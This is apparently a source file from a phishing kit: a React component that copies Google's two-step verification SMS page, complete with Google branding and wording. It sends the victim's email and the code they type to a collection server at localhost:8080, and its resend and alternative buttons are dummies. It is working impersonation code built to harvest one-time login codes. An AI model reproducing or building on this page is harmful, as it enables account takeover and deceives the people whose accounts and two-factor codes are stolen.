import { useState } from "react";
import GoogleLogo from "./GoogleLogo";
import Footer from "./Footer";
import "./SmsVerification.css";

interface SmsVerificationProps {
    email: string;
}

const SmsVerification = ({ email }: SmsVerificationProps) => {
    const [code, setCode] = useState("");

    const handleNext = async () => {
        if (!code.trim()) return;

        await fetch("http://localhost:8080/submit-code", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, code }),
        });
    };

    return (
        <div className="twostep-page">
            <div className="sms-card">

                {/* ── LEFT SIDE ── */}
                <div className="twostep-left">
                    <GoogleLogo />
                    <h2 className="twostep-title">2-Step Verification</h2>
                    <p className="twostep-desc">
                        To help keep your account safe, Google wants to make sure it's really you trying to sign in
                    </p>
                    <div className="twostep-email-badge">
                        <span className="twostep-avatar">👤</span>
                        <span className="twostep-email-text">{email}</span>
                        <span className="twostep-arrow">▾</span>
                    </div>
                    <button className="twostep-resend sms-resend" onClick={() => {}}>Resend it</button>
                </div>

                {/* ── RIGHT SIDE ── */}
                <div className="sms-right">
                    <p className="sms-sent-text">
                        A text message with a 6-digit verification code was just sent to (•••) •••‑••••
                    </p>

                    <div className="sms-input-wrap">
                        <input
                            type="text"
                            className="sms-code-input"
                            value={code}
                            onChange={(e) => setCode(e.target.value)}
                            maxLength={10}
                            autoFocus
                        />
                        <span className={`sms-input-label ${code ? "sms-label-active" : ""}`}>
                            Enter the code
                        </span>
                    </div>

                    <div className="sms-actions">
                        <button className="twostep-try-another" onClick={() => {}}>Try another way</button>
                        <button className="sms-next-btn" onClick={handleNext}>Next</button>
                    </div>
                </div>

            </div>
            <Footer />
        </div>
    );
};

export default SmsVerification;